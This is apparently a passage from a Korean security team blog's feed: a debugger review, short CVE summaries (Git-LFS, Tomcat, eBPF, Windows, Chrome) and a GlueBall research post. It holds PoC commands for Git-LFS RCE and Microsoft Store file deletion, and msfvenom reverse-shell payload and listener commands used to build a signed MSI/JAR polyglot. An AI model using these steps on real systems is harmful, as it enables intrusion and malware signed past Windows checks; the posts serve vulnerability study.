훑어보기</h1><pre><code class="hljs bash">$ ./gdbfrontend -w /home/fabu1ous/Desktop/GDBFrontend v0.3.0-gitListening on 127.0.0.1: &lt;http://127.0.0.1:5551/&gt;Open this address <span class="hljs-keyword">in</span> web browser: &lt;http://127.0.0.1:5551/terminal/&gt;</code></pre><p>브라우저로 접속한 <a href="http://127.0.0.1:5551/terminal/"><code>http://127.0.0.1:5551/terminal/</code></a>의 화면은 gdb shell이 띄워진 terminal과 gui 부분으로 나뉩니다. terminal 부분은 gdb와 다를 게 없으니 넘어가고, gui의 기본적인 구성과 기능 중 제가 써보면서 좋다고 느낀 점들을 써보겠습니다.</p><p>[ ! ] 개발자의 관점에서 디버거를 써본 적이 단 한 번도 없으니 유의하세요.</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/6.png"></p><p>함수 별로 assembly 코드로 출력해주며 다음에 실행될 인스트럭션은 연한 색으로 하이라이트 됩니다. 그중에서도 Call Stack 0번에 나타나는 함수의 하이라이트 된 부분은 eip (혹은 rip)입니다. 현재 프로그램 흐름의 위치를 대단히 직관적으로 알 수 있습니다. 글재주가 없어서 이렇게밖에 설명을 못 하겠네요. ㅎㅎ</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/7.png"></p><p>break point는 instruction의 주소를 클릭해서 생성 혹은 삭제할 수 있습니다. 좌측에 break point들의 목록을 보여주며 체크박스로 활성화 여부를 변경할 수 있습니다. 기존에 사용하던 pwndbg에서 가장 아쉬웠던 점이 바로 break point 관리가 번거롭다는 것인데, gdb-frontend는 GUI로 이 기능을 제공하니 상대적으로 좀 더 편리합니다.</p><h1 id="쓸-가치가-있는가"><a href="#쓸-가치가-있는가" class="headerlink" title="쓸 가치가 있는가?"></a>쓸 가치가 있는가?</h1><p>확장성이 좋다는 점을 내세우고 있는 만큼 설명할게 많진 않네요.</p><p>위에서 설명한 것들을 제외하면 대부분의 기능을 gdb에 의존하고 있고, 그냥 gdb만 사용하는 것과 크게 다르다는 느낌은 받지 못했습니다. gdb를 써보신 분들은 아시겠지만 gdb만을 사용해서 디버깅하는 변태는 없습니다. 적어도 해킹 씬에는 없을 거야. 메모리나 register값의 변화에 집중하며 디버깅하는 저에게 instruction 하나 실행할 때마다 <code>info reg</code> 같은 명령어를 입력하라고 한다면… 어후…</p><p>그런 점을 gdb-frontend가 개선해주진 않습니다. UI가 이쁘긴 하지만 저에게 필요한 부분은 구현이 안돼 있으니 ‘이쁜 쓰레기’라는 단어는 이럴 때 쓰는 말 이겠죠. 정작 Disassembly는 화면에 두 번이나 출력해줍니다. ㅎㅎ</p><blockquote><p>L0ch 曰 : 이쁜 쓰레기네 이쁜 쓰레기</p></blockquote><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/8.png"></p><p>gdb-frontend로 CTF문제 하나 풀고, 연구 글을 가장한 write-up을 작성하려 했지만 도저히 gdb-frontend만으로 문제를 풀 순 없을 거 같네요. 그래서 일말의 희망을 갖고 pwndbg와 연동해봤습니다만, gdb-frontend는 주객전도를 허용하지 않습니다. gdb-frontend의 ui가 없어질 정도로 terminal의 크기를 키워야 하고,</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/9.png"></p><p>무엇보다 gdb-frontend가 뻗어버립니다. 일단 제가 사용하면서 crash 나는 상황은 2가지 있었습니다.</p><ol><li>분석하고 있는 프로세스가 segmentation fault를 일으킬 때</li><li>존재하는 프로세스에 attach 할 때</li></ol><p>저에겐 이 두 가지 상황 모두 매우 큰 단점입니다. python exploit 코드에 따라 동작하고 있는 프로세스에 gdb를 attach 해 분석하는 것이 주된 사용방법인데, 그게 안된다니요… 그리고 segmentation fault에 대한 어떠한 정보도 얻을 수 없으니 취약점 찾는 입장에선 화딱지가 안 날 수가 없습니다.</p><h1 id="마무리"><a href="#마무리" class="headerlink" title="마무리"></a>마무리</h1><ol><li>gdb의 기능을 gui로 사용할 수 있다? <strong>No</strong><ul><li>결국 모든 동작은 gdb terminal을 통해 이루어짐.</li><li>gui로 gdb를 다루는 것이 아니라, gdb의 결괏값을 gui로 보여주는 플러그인</li><li>chrome으로 gdb를 사용하는 거라 오히려 불편함</li></ul></li><li>pwnable에 사용할 수 있다? <strong>No</strong></li></ol>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>gdb-frontend</tag>
      
      <tag>pwndbg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-27955: Git-LFS RCE Exploit</title>
    <link href="/2020/11/06/l0ch/2020-11-06/"/>
    <url>/2020/11/06/l0ch/2020-11-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html">Git-LFS RCE Exploit CVE-2020-27955</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Git &lt;= 2.29.2-git-lfs</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>대용량 파일을 업로드 하기 위해 github에서 개발한 extension인 git-lfs(Large File Storage)에서 Windows를 대상으로 원격 코드 실행이 가능한 취약점이 발견되었습니다.</p><p>해당 취약점을 악용하여 git-lfs로 업로드한 파일이 있는 저장소에서 Windows 시스템의 피해자가 저장소를 복제할 때 상호작용 없이 공격자의 악성 바이너리가 실행될 수 있습니다.</p><p>취약점의 PoC는 아래와 같습니다.</p><ol><li><p>공격자는 저장소에 실행할 명령어를 포함한 <code>git.*</code> 이름의 windows 바이너리 형식 파일을 추가합니다.</p><pre><code class="hljs bash">git.bat : @<span class="hljs-built_in">echo</span> git-lfs RCE exploit!!git add git.bat</code></pre></li><li><p>저장소에 lfs 파일을 추가합니다.</p><pre><code class="hljs bash">git lfs track <span class="hljs-string">&quot;* .dat&quot;</span> git add .gitattributes<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;git exploit PoC&quot;</span>&gt; lfs.datgit add lfs.dat</code></pre></li><li><p>바이너리와 lfs 파일을 커밋하고 원격 저장소에 업로드합니다.</p><pre><code class="hljs bash">git commit -a -m <span class="hljs-string">&quot;git-lfs exploit&quot;</span>git remote add origin https://repository_urlgit push -u origin master</code></pre></li><li><p>Windows 시스템에서 clone할 때 git-lfs 취약점이 트리거되어 기존 git 바이너리 대신 공격자의 원격 저장소에서 clone한 악성 <code>git.bat</code>이 사용자 상호작용 없이 실행됩니다.</p><pre><code class="hljs bash">PowerShell&gt; git <span class="hljs-built_in">clone</span> https://repository_urlgit-lfs RCE exploit!!</code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>git</tag>
      
      <tag>git lfs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-13935: Apache Tomcat Websocket 취약점</title>
    <link href="/2020/11/05/idioth/2020-11-05/"/>
    <url>/2020/11/05/idioth/2020-11-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.redteam-pentesting.de/2020/websocket-vulnerability-tomcat/">DIVING INTO A WEBSOCKET VULNERABILITY IN APACHE TOMCAT</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache Tomcat<ul><li>10.0.0-M1 ~ 10.0.0-M6</li><li>9.0.0.M1 ~ 9.0.36</li><li>8.5.0 ~ 8.5.56</li><li>7.0.27 ~ 7.0.104</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>해당 취약점은 Apache Tomcat의 WebSocket 프레임에서 <code>payloadLength</code>에 의해 무한 루프가 트리거 되어 DoS 공격으로 연결될 수 있는 취약점입니다.</p><p><a href="https://tools.ietf.org/html/rfc6455#section-5.2">RFC6455</a>의 WebSocket 프레임에서 payload length 필드가 127(2진수 1111111)이면 64비트 확장 payload length를 사용합니다. 이 payload length는 64비트 unsigned integer이지만 RFC에서는 최상위 비트가 항상 0이 되도록 요구합니다.</p><p>따라서 payload length 필드를 127로 설정해준 후 다음 8바이트의 MSB를 1로 설정해주기만 하면 DoS 공격을 수행할 수 있습니다.</p><p>취약점과 관련된 패치는 <code>payloadLength</code>가 음수가 될 경우 exception을 발생시키도록 패치되었습니다.</p><pre><code class="hljs java"><span class="hljs-comment">// The most significant bit of those 8 bytes is required to be zero</span><span class="hljs-comment">// (see RFC 6455, section 5.2). If the most significant bit is set,</span><span class="hljs-comment">// the resulting payload length will be negative so test for that.</span><span class="hljs-keyword">if</span> (payloadLength &lt; <span class="hljs-number">0</span>) &#123;    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> WsIOException(        <span class="hljs-keyword">new</span> CloseReason(            CloseCodes.PROTOCOL_ERROR,            sm.getString(<span class="hljs-string">&quot;wsFrame.payloadMsbInvalid&quot;</span>)        )    );&#125;</code></pre><p>해당 취약점에 관한 PoC Code는 <a href="https://github.com/RedTeamPentesting/CVE-2020-13935">여기</a>서 확인할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>idioth</tag>
      
      <tag>apache</tag>
      
      <tag>tomcat</tag>
      
      <tag>websocket</tag>
      
      <tag>dos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-27194: eBPF verifier bug</title>
    <link href="/2020/11/04/fabu1ous/2020-11-04/"/>
    <url>/2020/11/04/fabu1ous/2020-11-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel/">Fuzzing for eBPF JIT bugs in the Linux kernel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Linux kernel</p><p>eBPF</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>eBPF는 런타임 중 안전하게 커널 코드를 삽입하기 위해 Verifier와 BPF instruction을 사용합니다. Verifier는 레지스터의 값의 변화와 그 값들의 허용 범위(이하 range)등을 트래킹해  memory load와 store의 out-of-bound 여부를 검사하며,  32-bit와 64-bit 각각의 range를 구분해 관리합니다. OR연산이 끝난 후 그에 맞게  32-bit 레지스터의 range를 업데이트하는 <code>scalar32_min_max_or()</code>함수는 이 구분이 확실하지 못하고, 버그를 유발합니다.</p><pre><code class="hljs c"><span class="hljs-comment">/* ORing two positives gives a positive, so safe to</span><span class="hljs-comment">* cast result into s64.</span><span class="hljs-comment">*/</span>dst_reg-&gt;s32_min_value = dst_reg-&gt;umin_value;dst_reg-&gt;s32_max_value = dst_reg-&gt;umax_value;</code></pre><p>64-bit range를 32-bit range로 casting 하는 <code>scalar32_min_max_or()</code>의 코드 부분입니다. Verifier는 <code>s32_min_value</code>와 <code>s32_max_value</code>를 이용해 range를 트래킹 하는데, 만약 이 두 값이 같다면 레지스터 값을 상수로 인식하고 그에 따라 코드가 분기합니다. </p><p>만약 위 코드에서 <code>dst_reg-&gt;umin_value</code>가 1이고, <code>dst_reg-&gt;umax_value</code>가 25769803777이라면 <code>dst_reg-&gt;s32_min_value</code>와 <code>dst_reg-&gt;s32_max_value</code> 둘 다 1로 저장되어 레지스터를 range가 아닌 상수로 인식하게 됩니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.sosconhistory.net/soscon2018/pdf/day2_1100_3.pdf">https://www.sosconhistory.net/soscon2018/pdf/day2_1100_3.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>ebpf</tag>
      
      <tag>bpf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16877: Exploiting Microsoft Store Games</title>
    <link href="/2020/11/03/l0ch/11-03_1day1line/"/>
    <url>/2020/11/03/l0ch/11-03_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.ioactive.com/2020/11/cve-2020-16877-exploiting-microsoft.html">CVE-2020-16877: Exploiting Microsoft Store Games</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 - Microsoft Store</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Store에서 배포하는 UWP(Universal Windows platform) 앱은 일반적으로  <code>C:\Program Files\WindowsApps</code> 디렉터리에 저장되어 일반적인 권한으로 접근할 수 없으며 Appx라는 형식의 파일을 앱 설치 관리자 프로그램을 통해서만 설치/제거가 가능합니다. </p><p>지난 6월 Microsoft는 게임 앱의 모드를 지원하기 위해 수정이 가능한 Windows 앱을 호스팅 하는 디렉터리인 <code>C:\ProgramFiles\ModifiableWindowsApps</code>을 추가했는데, 이 기능에 심볼릭 링크를 사용해 arbitrary file deletion 취약점이 발견되었습니다.</p><p>PoC는 아래와 같습니다.</p><ol><li>다른 시스템 드라이브 <code>D:\</code>에 pivot 할 경로를 생성하고 windows 저장소 설정을 통해 기본 저장 위치를 <code>D:\</code> 로 변경합니다</li></ol><pre><code class="hljs powershell"><span class="hljs-built_in">md</span> <span class="hljs-string">&quot;D :\Program Files&quot;</span><span class="hljs-built_in">md</span> <span class="hljs-string">&quot;D :\pivot&quot;</span></code></pre><ol start="2"><li><p>Microsoft Store에서 모드 지원이 되는 게임 앱을 받아 설치하면 <code>D:\Program Files\ModifiableWindowsApps</code> 하위에 해당 앱의 디렉터리가 생성됩니다.</p></li><li><p>이중 심볼릭 링크를 생성해 앱의 디렉터리가 심볼릭 링크의 교차점이 되도록 만들고, 심볼릭 링크로 리디렉션 할 최종 디렉터리는 삭제할 시스템 권한의 디렉터리로 설정합니다.</p></li></ol><pre><code class="hljs powershell">mklink / J <span class="hljs-string">&quot;D:\Program Files\ModifiableWindowsApps&quot;</span> <span class="hljs-string">&quot;D:\pivot&quot;</span>mklink / J <span class="hljs-string">&quot;D:\pivot\Game_App&quot;</span> <span class="hljs-string">&quot;C:\arbitrary_path\to_delete&quot;</span></code></pre><ol start="4"><li>앱을 삭제하면 이중 심볼릭 링크로 인해 시스템 권한으로 임의 경로의 파일이 삭제됩니다.</li></ol><p>작성자는 시스템 권한의 쉘을 실행하는 데모 영상 또한 공개했습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file deletion</tag>
      
      <tag>microsoft store</tag>
      
      <tag>symbolic link</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-17087: Windows kernel cng.sys pool-based buffer overflow</title>
    <link href="/2020/11/02/idioth/2020-11-02/"/>
    <url>/2020/11/02/idioth/2020-11-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2104">Windows Kernel cng.sys pool-based buffer overflow in IOCTL 0x390400</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 10 1903(64-bit)</li><li>Maybe since at least Windows 7</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>윈도우 커널 암호화 드라이버인 cng.sys에서 권한 상승이 가능한 취약점이 발견되었습니다. 해당 취약점은 IOCTL 0x390400 처리 중 <code>cng!CfgAdtpFormatPropertyBlock</code> 함수에서 16-bit integer truncation에 의해 발생했습니다.</p><pre><code class="hljs c">CONST USHORT DestinationSize = (USHORT)(<span class="hljs-number">6</span> * SourceLength);PWCHAR OutputBuffer = BCryptAlloc(DestinationSize);<span class="hljs-keyword">for</span> (USHORT i = <span class="hljs-number">0</span>; i &lt; SourceLength; i++) &#123;*OutputBuffer++ = <span class="hljs-string">&quot;0123456789abcdef&quot;</span>[*SourceBuffer &gt;&gt; <span class="hljs-number">4</span>];*OutputBuffer++ = <span class="hljs-string">&quot;0123456789abcdef&quot;</span>[*SourceBuffer &amp; <span class="hljs-number">0xF</span>];*OutputBuffer++ = <span class="hljs-string">&#x27; &#x27;</span>;SourceBuffer++;&#125;</code></pre><p><code>SourceLength</code>의 값이 <code>0x2AAB</code>보다 크거나 같으면 NonPagedPool에 비정상적으로 작은 버퍼가 할당되고 binary-to-hex 변환 루프에 의해 오버 플로우가 발생합니다. 윈도우 10 1903에서 테스트되었지만 윈도우 7부터 취약점이 존재하는 것으로 예상되며 현재 취약점이 악용되고 있다고 합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
      <tag>ioctl</tag>
      
      <tag>cng.sys</tag>
      
      <tag>buffer overflow</tag>
      
      <tag>integer overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] CVE-2020-1464: GlueBall</title>
    <link href="/2020/11/01/l0ch/cve-2020-1464/"/>
    <url>/2020/11/01/l0ch/cve-2020-1464/</url>
    
    <content type="html"><![CDATA[<p>안녕하세요! 글 쓰는 걸 미루고 미루다 idioth 팀장님의 구박에 겨우겨우 첫 글을 쓰는 L0ch입니다. </p><p><del>악덕 상사 우우 길 가다 레고 블록이나 밟아라</del> </p><p>오늘은 Windows의 취약점 하나를 들고 왔는데요, 함께 보실까요? </p><h1 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h1><p>GlueBall이라고 불리는 CVE-2020-1464는 2018년 9월에 제보되었습니다. 근데 마소 친구들이 패치 안 하고 있다가 2년이 지난 최근 patch tuesday라고 불리는 정기 패치에서 패치가 되었…? 왜 지금 와서???</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img1.png"></p><p>이상하긴 하지만… 넘어가도록 하고 취약점을 이해하는데 필요한 배경 지식부터 알아보도록 합시다!</p><h1 id="MSI-Microsoft-Installer"><a href="#MSI-Microsoft-Installer" class="headerlink" title="MSI (Microsoft Installer)"></a>MSI (Microsoft Installer)</h1><p>Windows 설치 패키지<br>→ Windows용 애플리케이션의 설치 및 업데이트를 배포하는 데 사용됩니다.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img2.png"></p><p>오늘의 희생양(ㅎㅎ)이 될 우리 크롬 어서 오고.<br>크롬도 MSI로 배포되는 것을 알 수 있습니다. malicious 하게 꾸며줄 테니 조금만 기다리라구~</p><h1 id="Code-Signing-Certificate-코드-서명-인증서"><a href="#Code-Signing-Certificate-코드-서명-인증서" class="headerlink" title="Code Signing Certificate(코드 서명 인증서)"></a>Code Signing Certificate(코드 서명 인증서)</h1><blockquote><p><strong>Code Signing Certificate</strong><br>MS가 도입한 실행파일과 스크립트의 디지털 서명 과정으로, 이러한 인증서는 파일이 안전한 파일임을 증명해준다. SmartScreen filter는 인증서에 대한 자체적인 white list DB를 관리해 해당 인증서가 안전한지 아닌지<br>판단한다. 인증서가 존재하지 않거나 파일이 변조되어 인증서가 유효하지 않으면 실행할 때 경고를 띄워<br>사용자에게 알린다.</p></blockquote><p><img src="/2020/11/01/l0ch/cve-2020-1464/img3.png"></p><p>코드 서명 인증서가 도입되면서, 인증서가 확인되지 않은 파일의 무분별한 실행이 줄었습니다. 그러나 여기서 끝나면 섭섭하죠? 유효하지 않은 인증서임에도 인증서 검증을 우회할 수 있는 취약점이 발견되었는데 이것이 오늘 설명할 GlueBall입니다.</p><h1 id="GlueBall-CVE-2020-1464"><a href="#GlueBall-CVE-2020-1464" class="headerlink" title="GlueBall : CVE-2020-1464"></a>GlueBall : CVE-2020-1464</h1><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>취약점은 MSI 파일의 인증서 검증 과정에서 발생합니다. </p><p>MSI 파일을 실행하면 <code>msisip.dll</code>의 <code>MsiSIPVerifyIndirectData()</code> 함수에서 파일의 시작 부분이 유효한 MSI 파일인지 검증하고 서명을 확인합니다.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img4.png"></p><p>그런데 이때 파일의 사이즈를 검증하지 않아 MSI 파일의 뒤에 임의의 데이터가 추가되어도 유효한 인증서라고 판단하게 되고, 공격자는 이를 이용해 인증서 검증을 우회하고 malicious 파일을 실행하도록 할 수 있습니다.</p><h2 id="JAR-Java-Archive"><a href="#JAR-Java-Archive" class="headerlink" title="JAR(Java Archive)"></a>JAR(Java Archive)</h2><p><img src="/2020/11/01/l0ch/cve-2020-1464/img5.webp"></p><p>JAR은 자바 플랫폼 배포를 위한 패키지 파일 포맷입니다.<br>특징으로는 zip 포맷으로 빌드되어 자바 런타임에서 로드될 때 파일의 끝에서부터 로드됩니다.</p><p>→ 파일 앞에 임의의 데이터가 있어도 정상 실행이 가능합니다.</p><p>슬슬 감이 올락 말락 하죠??</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>앞서 나온 취약점과 JAR 파일의 특성을 조합하면..?</p><p><strong>MSI 파일 끝에 임의 데이터가 와도 유효한 인증서가 되는 취약점 + 파일 앞에 임의의 데이터가 있어도 정상 실행되는 jar</strong></p><p>축하합니다! 익스플로잇 시나리오가 완성되었습니다!</p><p>그림으로 정리하면 다음과 같습니다.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img6.png" alt="출처:https://www.securityinbits.com/malware-analysis/interesting-tactic-by-ratty-adwind-distribution-of-jar-appended-to-signed-msi/"></p><p>만능 메타스플로잇으로 리버스 쉘 malicious 파일을 생성해서 익스를 해볼게요.</p><p>msfvenom으로 리버스 쉘을 여는 jar포맷의  malicious 파일을 생성합니다.</p><pre><code class="hljs markdown">msfvenom -p java/meterpreter/revserse<span class="hljs-emphasis">_https LHOST=[HOST IP] -f jar -o [filename].jar</span></code></pre><p><img src="/2020/11/01/l0ch/cve-2020-1464/img7.png"></p><p>리스너도 미리 열어두겠습니다.</p><pre><code class="hljs markdown">handler -p java/meterpreter/reverse<span class="hljs-emphasis">_https -H 0.0.0.0 </span></code></pre><p><img src="/2020/11/01/l0ch/cve-2020-1464/img8.png"></p><p>생성된 jar 파일과 크롬 설치 msi 파일을 합칩니다. 이때 꼭 msi파일 뒤에 jar 파일이 오도록 순서를 지켜야 한다는 점!</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img9.png"></p><p>이제 생성된 exploit.jar 에서 인증서가 유효한지 확인해보면</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img10.png"></p><p>요렇게 유효한 인증서로 나오는 것을 볼 수 있습니다. </p><p>실행을 해보면 피해 PC에서는 아무 반응도 없지만, 프로세스에서는 자바가 돌아가고 있고</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img11.png"></p><p>위 사진과 같이 리버스 쉘이 정상적으로 동작하는 걸 볼 수 있습니다!</p><h2 id="Patch-diffing"><a href="#Patch-diffing" class="headerlink" title="Patch diffing"></a>Patch diffing</h2><p>MS는 이에 대한 패치를 내놨는데요, 어떻게 패치를 했는지 패치 이후의 msisip.dll를 구해 비교해보겠습니다.</p><blockquote><p>💡주의! 글쓴이의 삽질이 담겨 있습니다.</p></blockquote><p>않이 근데.. 이거 익스하고 글 좀 쓰고 디핑 하려고 보니까 그새 윈도우가 업데이트를 해버렸네..?</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img12.jpg"></p><p>아 ** </p><ul><li>자동 업데이트 안 끔</li><li>스냅샷 안 만들어놓음</li></ul><p>→ 패치 전의 msisip.dll 못 구함 → ?????????</p><p>윈도우 원데이 분석할 땐 자동 업데이트는 꼭 끄도록 해요……. 아니면 스냅샷이라도…</p><p>패치 전의 msisip.dll을 어떻게 구하지? 어떻게 구하긴 조진 거지 ㅋㅋ</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img13.png"></p><p>엿같은 자동 업데이트 덕분에 던질 뻔했지만..^^<br>결국 idioth형 vm에 패치 전 파일이 있어서 그거 구걸해서 디핑 해버렸지요. 팀장님 최고 ~<br>넘겨주는 대신 리제로 정주행 하라는 협박은 못 들은 걸로 하겠습니다; </p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img14.png"></p><p>회색 노드는 새로 추가된 코드, 노란색 노드는 변경된 노드입니다.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img15.png"></p><p>회색 노드를 보면 <code>MsiSIPVerifyIndirectData()</code> 함수에서 <code>NeedFileSizeVerification()</code> 과 <code>VerifyFileSize()</code> 를 호출하는 코드가 추가된 것을 보아 MSI 파일의 사이즈를 확인하는 코드를 추가해 취약점 패치를 한 것을 알 수 있습니다.</p><p>취약점 분석이랑 익스 하는 것보다 디핑 하는데 시간을 훨씬 많이 썼네요…^^ 이  과정을 개선할 여지가 있을 것 같아 다음 글은 디핑과 관련된 연구 주제 일 것 같습니다.  이거 하느라 윈도우 vm만 5개 만든 건 안 비밀 ^.^ </p><p>그럼 다음 글로 돌아올게요 안녕!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>L0ch</tag>
      
      <tag>msi</tag>
      
      <tag>code signing certificate</tag>
      
      <tag>jar</tag>
      
      <tag>glueball</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-15238: Blueman argument injection</title>
    <link href="/2020/10/31/fabu1ous/2020-10-31/"/>
    <url>/2020/10/31/fabu1ous/2020-10-31/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.exploit-db.com/exploits/48963">Blueman &lt; 2.1.4 - Local Privilege Escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Blueman 2.1.4 이전 버전</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>D-bus(Desktop-bus)는 IPC 혹은 RPC 메커니즘입니다. D-bus의 DHCPClient 메소드와 Blueman 사이에 arguments sanitizing 과정이 없어 argument injection이 발생하고, 시스템 구성에 따라 impact가 2가지로 나뉩니다. </p><pre><code class="hljs routeros">1. isc-dhcp-client 사용 시<span class="hljs-built_in">ip </span>명령어에 argument injection, 인터페이스를 종료하는 Dos2. dhcpd package 사용 시<span class="hljs-string">&quot;-c/arbitrary_script_path&quot;</span>옵션을 사용해 임의의 스크립트를 실행</code></pre><p>대부분의  D-bus 인터페이스는 PolicyKit으로 Authentication을 거치지만 Blueman 2.0.6 이전 버전은 Polkit-1이 기본적으로 비활성화되어있어, 모든 로컬 유저가 취약점을 트리거할 수 있습니다. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.eyecontrol.nl/blog/the-story-of-3-cves-in-ubuntu-desktop.html">https://www.eyecontrol.nl/blog/the-story-of-3-cves-in-ubuntu-desktop.html</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>linux</tag>
      
      <tag>blueman</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-6449: Exploiting a textbook use-after-free in Chrome</title>
    <link href="/2020/10/30/l0ch/10-30_1day1line/"/>
    <url>/2020/10/30/l0ch/10-30_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/research/CVE-2020-6449-exploit-chrome-uaf">Exploiting a textbook use-after-free in Chrome</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Chrome version: master branch build 79956ba, asan build 80.3987.132 Operating System: Ubuntu 18.04</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2020-6449는 Chrome에서 사용하는 blink 엔진의 <code>WebAudio</code> 모듈에서 발생하는 Use-After-Free 취약점 입니다. </p><p>취약점은 <code>DeferredTaskHandler::BreakConnections</code> 에서 발생합니다. 일반적으로 <code>active_source_handlers_</code>는 <code>finished_source_handlers_</code> 의 원시 포인터를 활성 상태로 유지하는 역할을 하며 사용이 완료된 이후에는 할당된 <code>active_source_handlers_</code> 와 <code>finished_source_handlers_</code> 가 같이 free되어야 합니다.</p><p>그러나 컨텍스트를 삭제하여 <code>BaseAudioContext::Uninitialize</code> 가 실행된 이후 <code>DeferredTaskHandler::ClearHandlersToBeDeleted</code> 를 호출하면 <code>active_source_handlers_</code> 만 free되고 <code>finished_source_handlers_</code> 에 free된 포인터가 남게 됩니다. 이후 <code>DeferredTaskHandler::BreakConnections</code> 를 호출해 UAF 취약점을 트리거할 수 있습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://securitylab.github.com/research/garbage-collection-uaf-chrome_gc">https://securitylab.github.com/research/garbage-collection-uaf-chrome_gc</a></p><p><a 